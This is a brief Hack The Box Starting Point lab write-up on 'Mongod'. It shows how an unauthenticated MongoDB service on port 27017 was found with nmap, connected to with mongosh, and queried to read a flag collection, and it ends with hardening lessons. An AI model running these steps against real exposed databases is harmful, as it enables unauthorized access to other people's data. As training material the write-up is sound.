---
title: "Lab: Mongod"
status: "Completed"
track: "HTB Starting Point"
date: "2025-09-01"
---

# Lab: Mongod

## Objective
MongoDB without access control (27017/tcp).

## Methodology
1. **Recon** — Identify service/entry point.
2. **Finding** — Confirm misconfiguration/vulnerability.
3. **Exploit** — Execute the minimal steps to gain access.
4. **Post** — Retrieve proof, note hardening steps.

## Key Commands
```bash
nmap -sV -p 27017 <host>
mongosh mongodb://<host>:27017
> show dbs
> use sensitive_information
> db.flag.find().pretty()
```

## Lessons Learned
- Disable/lock down default or legacy services.
- Restrict network exposure; prefer MFA and least privilege.
- Monitor and alert on anomalous access.